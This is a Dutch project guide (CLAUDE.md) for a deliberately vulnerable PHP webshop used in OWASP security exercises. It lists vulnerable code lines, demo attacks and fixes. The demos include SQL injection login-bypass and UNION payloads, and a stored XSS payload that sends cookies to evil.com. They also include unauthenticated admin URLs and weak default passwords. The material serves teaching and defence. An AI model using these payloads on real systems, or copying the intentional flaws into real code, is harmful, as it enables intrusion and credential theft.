# TechShop Security Lab - CLAUDE.md

## Project Overzicht
Een **opzettelijk onveilige** PHP-webshop voor educatieve beveiligingsopdrachten.
Gebouwd met PHP + SQLite (geen XAMPP nodig).

## Hoe starten
```bash
cd c:\dev\onveilige-webshop
php -S localhost:8080
```
Open: http://localhost:8080

## Test Accounts
| Gebruiker | Wachtwoord | Rol |
|-----------|-----------|-----|
| admin     | admin123  | Administrator |
| john      | password  | Gebruiker |
| jane      | 123456    | Gebruiker |
| test      | test      | Gebruiker |

## Technische Stack
- PHP 8.5 (ingebouwde webserver)
- SQLite via PDO (database: `webshop.db`, wordt auto aangemaakt)
- Geen framework, geen composer

## Bestandsstructuur
```
config.php          - Database verbinding + hulpfuncties (SQLite/PDO)
index.php           - Homepage met zoekfunctie
login.php           - Inlogpagina
register.php        - Registratiepagina
logout.php          - Uitloggen
products.php        - Productoverzicht
product.php         - Productdetail + reviews
admin.php           - Admin dashboard
contact.php         - Contactformulier
includes/
  header.php        - HTML header + navigatie
  footer.php        - HTML footer
db.sql              - Originele MySQL schema (referentie)
webshop.db          - SQLite database (auto gegenereerd)
logs/actions.log    - Actielog
```

---

## Opdracht: Beveiligingslekken Analyseren

De opdracht bestaat uit **6 categorieën** van OWASP kwetsbaarheden.
Voor elke categorie: demonstreer de aanval, identificeer de OWASP-categorie, stel een oplossing voor.

---

### Opdracht 1: SQL Injection
**OWASP A03:2021 – Injection**

Kwetsbare locaties:
- `login.php:14` — Inlogquery met `$username` en `$password` direct in SQL
- `index.php:14` — Zoekquery met `$search` niet ge-escaped
- `products.php:11` — Zelfde als index.php
- `product.php:9` — `$product_id` direct in query zonder quotes
- `product.php:27` — INSERT comments met `$product_id` onbeschermd
- `product.php:36` — SELECT comments met `$product_id` onbeschermd
- `register.php:13,19` — Check en INSERT met ruwe gebruikersinvoer
- `admin.php:34,43` — DELETE en UPDATE met `$user_id` uit GET-parameter

**Demo aanvallen:**
```
Login bypass:    gebruikersnaam: ' OR '1'='1' --
                 wachtwoord: (leeg)

Union attack:    zoek: ' UNION SELECT username,password,email,id,is_admin,created_at FROM users --
```

**Oplossing:** Gebruik prepared statements met PDO:
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

---

### Opdracht 2: Cross-Site Scripting (XSS)
**OWASP A03:2021 – Injection (XSS)**

Kwetsbare locaties:
- `products.php:24,30` — `$search` onescaped in output (Reflected XSS)
- `index.php:38` — `$search` in formulier value (Reflected XSS)
- `product.php:60,61,73` — Productnaam/prijs/beschrijving onescaped (Stored XSS)
- `product.php:124,127` — Username en commentaar onescaped (Stored XSS)
- `admin.php:79` — `$message` uit GET-parameter onescaped (Reflected XSS)
- `admin.php:126` — Wachtwoord onescaped in admin tabel

**Demo aanvallen:**
```
Reflected XSS:  Zoek naar: <script>alert('XSS')</script>

Stored XSS:     Voeg review toe met username of tekst:
                <script>document.location='http://evil.com?c='+document.cookie</script>
```

**Oplossing:** Gebruik altijd `htmlspecialchars()`:
```php
echo htmlspecialchars($product['name'], ENT_QUOTES, 'UTF-8');
```

---

### Opdracht 3: Insecure Direct Object References (IDOR)
**OWASP A01:2021 – Broken Access Control**

Kwetsbare locaties:
- `product.php:7` — `$product_id = $_GET['id'] ?? 1;` — geen autorisatiecheck
- `admin.php:29` — `$user_id = $_GET['user_id'] ?? '';` — acties zonder check wie het verzoek doet

**Demo aanvallen:**
```
Bekijk product van elk ID:         product.php?id=1, ?id=2, ?id=999
Maak willekeurige gebruiker admin:  admin.php?action=make_admin&user_id=2
Verwijder willekeurige gebruiker:  admin.php?action=delete_user&user_id=3
```

**Oplossing:** Controleer of de ingelogde gebruiker recht heeft op de resource:
```php
if ($order['user_id'] !== $_SESSION['user_id']) {
    die("Toegang geweigerd");
}
```

---

### Opdracht 4: Sensitive Data Exposure
**OWASP A02:2021 – Cryptographic Failures**

Kwetsbare locaties:
- `config.php:2` — `DEBUG_MODE = true` — foutmeldingen zichtbaar voor iedereen
- `config.php:82-86` — Volledige SQL-queries zichtbaar via `?debug_sql=1`
- `config.php:129-131` — SQL-fouten inclusief query tekst getoond aan gebruiker
- `admin.php:126` — Wachtwoorden in **plaintext** zichtbaar in admin panel
- `admin.php:58` — Wachtwoorden worden in plaintext opgeslagen (geen hashing)
- `db.sql / config.php` — Standaard accounts met zwakke wachtwoorden

**Demo:**
```
Bekijk SQL debug:  login.php?debug_sql=1
Bekijk wachtwoorden: Inloggen als admin → admin.php
```

**Oplossing:**
- Haal `DEBUG_MODE` uit productie
- Hash wachtwoorden: `password_hash($password, PASSWORD_BCRYPT)`
- Verifieer met: `password_verify($input, $hash)`

---

### Opdracht 5: Broken Access Control
**OWASP A01:2021 – Broken Access Control**

Kwetsbare locaties:
- `admin.php:1-6` — **Geen enkele authenticatiecheck!** Iedereen kan admin.php openen
- `admin.php:27-64` — Alle admin-acties uitvoerbaar zonder admin te zijn

**Demo aanval:**
```
Ga zonder ingelogd te zijn naar: http://localhost:8080/admin.php
→ Volledige toegang tot admin dashboard

Voer acties uit als gast:
admin.php?action=delete_all_comments
admin.php?action=reset_passwords
admin.php?action=make_admin&user_id=2
```

**Oplossing:** Voeg bovenaan admin.php toe:
```php
if (!isLoggedIn() || !isAdmin()) {
    header("Location: login.php");
    exit();
}
```

---

### Opdracht 6: Input Validation Failures
**OWASP A03:2021 – Injection / A04:2021 – Insecure Design**

Kwetsbare locaties:
- `register.php:65` — E-mailveld gebruikt `type="text"` i.p.v. `type="email"`
- `register.php:72` — Wachtwoordveld gebruikt `type="text"` i.p.v. `type="password"` (wachtwoord zichtbaar!)
- `register.php:8-10` — Geen wachtwoordsterkte validatie (1 teken toegestaan)
- `product.php:7` — `$product_id` niet gecast naar integer
- `index.php:8` — Geen lengtelimiet op zoekterm
- `contact.php:16` — Geen backend e-mailvalidatie

**Demo:**
```
Registreer met wachtwoord "a" → werkt
Registreer met e-mail "geen-email" → werkt
Typ in wachtwoordveld: wachtwoord is zichtbaar in plaintext
```

**Oplossing:**
```php
// Integer validatie
$product_id = (int) $_GET['id'];
if ($product_id <= 0) die("Ongeldig ID");

// Email validatie
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) die("Ongeldig e-mailadres");

// Wachtwoord vereisten
if (strlen($password) < 8) die("Wachtwoord minimaal 8 tekens");
```

---

## Alle Kwetsbaarheden op een Rij

| # | Bestand | Regel | Type | Categorie |
|---|---------|-------|------|-----------|
| 1 | login.php | 14 | SQL Injection | OWASP A03 |
| 2 | index.php | 14 | SQL Injection | OWASP A03 |
| 3 | products.php | 11 | SQL Injection | OWASP A03 |
| 4 | product.php | 9 | SQL Injection | OWASP A03 |
| 5 | product.php | 27 | SQL Injection | OWASP A03 |
| 6 | product.php | 36 | SQL Injection | OWASP A03 |
| 7 | register.php | 13,19 | SQL Injection | OWASP A03 |
| 8 | admin.php | 34,43 | SQL Injection | OWASP A03 |
| 9 | contact.php | 23 | SQL Injection | OWASP A03 |
| 10 | products.php | 24,30 | Reflected XSS | OWASP A03 |
| 11 | index.php | 38 | Reflected XSS | OWASP A03 |
| 12 | product.php | 60,73 | Stored XSS | OWASP A03 |
| 13 | product.php | 124,127 | Stored XSS | OWASP A03 |
| 14 | admin.php | 79 | Reflected XSS | OWASP A03 |
| 15 | admin.php | 1-6 | Broken Access Control | OWASP A01 |
| 16 | admin.php | 27-64 | Broken Access Control | OWASP A01 |
| 17 | product.php | 7 | IDOR | OWASP A01 |
| 18 | admin.php | 29,34,43 | IDOR | OWASP A01 |
| 19 | admin.php | 126 | Plaintext Passwords | OWASP A02 |
| 20 | config.php | 2 | Debug Mode | OWASP A05 |
| 21 | config.php | 82-86 | SQL Debug Exposure | OWASP A05 |
| 22 | register.php | 72 | Password Visible | OWASP A04 |
| 23 | register.php | 65 | E-mail Validatie | OWASP A04 |
| 24 | product.php | 7 | Integer Validatie | OWASP A04 |

---

## Ethische Disclaimer
Deze vaardigheden zijn uitsluitend bedoeld voor:
- Beveiligen van eigen applicaties
- Security audits met toestemming
- Bug bounty programma's
- Educatieve doeleinden

**NOOIT** gebruiken voor ongeautoriseerde toegang of schade aan systemen.
